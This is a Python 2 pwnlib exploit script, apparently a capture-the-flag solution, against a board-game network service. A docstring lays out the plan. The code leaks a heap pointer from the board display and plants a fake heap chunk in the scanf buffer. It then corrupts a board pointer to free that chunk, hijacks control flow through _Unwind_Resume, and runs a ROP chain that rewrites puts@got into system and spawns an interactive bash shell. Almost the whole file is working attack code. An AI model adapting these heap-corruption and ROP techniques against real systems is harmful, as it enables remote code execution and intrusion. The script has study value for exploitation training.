from pwnlib import *

"""

Overall exploit strategy:

- fill up the board
- eat a ptr to find the heap
- figure out where the scanf buffer is
- check that there is a "good" ptr (no "11" in it) in the scanf buffer; if
  not, reconnect and start over
- surrender
- put a fake chunk in the scanf buffer
- set up a pointer at the bottom of the board (using pieces)
- fill up the board
- corrupt a pointer slightly
- regret -> load board from slightly corrupted pointer -> our pointer goes
  from the bottom of the board to the top, overwriting a pointer fully
- regret again -> free is called on the pointer -> our fake chunk is freed
- surrender to restart -> player struct goes inside scanf buffer
- overwrite the scanf buffer to get $pc
- set up the context better via _Unwind_Resume, then pivot to ROP
- using ROP, add bytes to puts@got to get system@got
- win


"""

def c():
	x = s.ru("Time remain: ")
	s.ru("\n\n")
	return x

missing_clears = 0
def piece(letter, number, clear=True):
	global missing_clears
	s.send("%s%d\n" % (letter, number))
	if not clear:
		missing_clears += 1
	else:
		return c()

def flush_pieces():
	global missing_clears
	for i in range(missing_clears):
		c()
	missing_clears = 0

def fill_board():
	for l in letters:
		for i in range(1, 9):
			piece(l, i, clear=False)
	for l in letters:
		piece(l, 11, clear=False)

	for l in "ABCDEFGHI":
		piece(l, 10, clear=False)

	piece("A", 8, clear=False)
	flush_pieces()

def emplace_payload(payload, offset):
	for i, block in reversed(list(enumerate(blocks(payload, 8)))):
		t = s.get_sock().makefile("rw", bufsize=0x1000)
		t.write(" "*(offset - 2 + 8*i) + "A1" + block)
		t.flush()
		c()
		s.send("regret\n")
		c()

def surrender():
	s.send("surrender\n")
	s.ru("(y/n)\n")
	s.send("n\n") # no history
	s.ru("(y/n)\n")
	s.send("y\n") # play again
	c()

def eat_ptr():
	result = ""
	for i in range(32):
		piece = s.recv(1)
		if piece == "\n":
			s.ru(" ")
			piece = s.recv(1)
		if piece == ".":
			result = "00" + result
		elif piece == "X":
			result = "10" + result
		elif piece == "O":
			result = "01" + result
		elif piece == "\x00":
			result = "11" + result
		else:
			assert False, piece

	ptr = int(result, 2)
	return ptr

pieces = {
	0b00: ".",
	0b10: "X",
	0b01: "O"
}

# a ptr is "good" if it doesn't contain "11" in its bit sequence, because then
# we cannot create it on the board
def is_good_ptr(ptr):
	while ptr != 0:
		if (ptr & 0b11) == 0b11:
			return False
		ptr >>= 2
	return True


letters = "ABCDEFGHIJKLMNOPQRS"


############


s = None

def _play_and_get_good_ptr():
	global s
	s = Socket(("localhost", 6767))
	c()

	fill_board()

	s.send("%s%d\n" % ("B", 8))
	s.ru("19 ")

	heap_ptr = eat_ptr()
	c()

	surrender()

	print "got heap ptr: 0x%x" % heap_ptr
	assert (heap_ptr & 0xfff) == 0xda0 # for now

	scanf_buf = heap_ptr - 0x12080
	assert (scanf_buf & 0xff) == 0x20

	for i in range(0x1000):
		if is_good_ptr(scanf_buf + i):
			return scanf_buf, scanf_buf + i
	return None

# play until we get a good ptr
def play_and_get_good_ptr():
	while True:
		r = _play_and_get_good_ptr()
		if r is not None:
			return r


scanf_buf, ptr = play_and_get_good_ptr()
print "OK, got ptr: 0x%x" % ptr
assert is_good_ptr(ptr)


##### emplace stuff into the scanf buffer at a dynamic offset
# this is actually a fake chunk
payload  = pq(0x0)
payload += pq(0x21) # size
payload += "A"*16

# next chunk
payload += pq(0)
payload += pq(0x21)
payload += "B"*16

# next next
payload += pq(0)
payload += pq(0x21)

chunk_offset = ptr - scanf_buf - 0x10

emplace_payload(payload, chunk_offset)


##### play again
##### build up a ptr into the scanf buffer at the bottom of the board

assert missing_clears == 0

for i in reversed(range(1, 4)):
	for l in letters:
		piece(l, i, clear=False)
for l in letters:
	piece(l, 16, clear=False)

for i in reversed(range(17, 20)):
	for l in letters:
		piece(l, i, clear=False)

for l in letters:
	piece(l, 5, clear=False)


ps = []
for _ in range(32):
	ps.append(pieces[ptr & 0b11])
	ptr >>= 2


offset = 0

for p in ps:
	if p == "X":
		letter = chr((offset % 19) + ord("A"))
		number = 19 - (offset / 19)
		piece(letter, number, clear=False)

	elif p == "O":
		letter = chr(18 - (offset % 19) + ord("A"))
		number = (offset / 19) + 1
		piece(letter, number, clear=False)
	
	elif p == ".":
		pass
	else:
		assert False, p

	offset += 1


num_pieces = missing_clears

for l in letters:
	piece(l, 6, clear=False)

flush_pieces()

for i, j in enumerate(range(163 - num_pieces)):
	piece(chr(0x41 + i), 10)


# corrupt third ptr
print piece("I", 16) 

# fix up board
s.send("regret\n")
c()

# delete fake chunk
s.send("regret\n")
c()

# restart
s.send("surrender\n")
s.ru("(y/n)\n")
s.send("n\n")
s.ru("(y/n)\n")
s.send("y")
c()


payload_addr = scanf_buf + chunk_offset + 0x10
leave_ret = 0x401200
pop2_ret = 0x404e40
pop3_ret = 0x404e3e
unwind_resume = 0x403116
pop_rdi = 0x0000000000404e43
pop_rsi_r15 = 0x0000000000404e41
puts_plt = 0x400dc0
puts_got = 0x607028
pop_rax_pop2 = 0x0000000000402fa4
scanf_plt = 0x400e70
xorer = 0x000000000040447f # xor ecx, dword ptr [rax - 0x77] ; ret
xchg = 0x0000000000403c4b # xchg eax, ecx ; sar bh, cl ; dec ecx ; ret
add_rax = 0x000000000040319f # add byte ptr [rax - 0x77], cl ; ret

def set_rax(val):
	return pq(pop_rax_pop2) + pq(val) + pq(0)*2

def set_ecx(val): # ruins eax, ebx
	return set_rax(val + 1) + pq(xchg)

def add_byte(addr, b):
	return set_ecx(b) + set_rax(addr + 0x77) + pq(add_rax)


# pivot through _Unwind_Resume
payload  = ""
payload += pq(payload_addr + 0x20) # vtable ptr
payload += pq(pop3_ret)
payload += pq(leave_ret)
payload += "A"*8
payload += pq(unwind_resume)

# time for rop!

# change puts -> system
payload += add_byte(puts_got + 1, 0x5d)
payload += add_byte(puts_got + 2, 0xfd)
payload += pq(pop_rdi)
payload += pq(payload_addr + len(payload) + 0x10)
payload += pq(puts_plt)
payload += "bash\x00"

t = s.get_sock().makefile("rw", bufsize=0x1000)
t.write(" "*(chunk_offset + 0x10 - 2) + "A1" + payload)
t.flush()

s.interact()
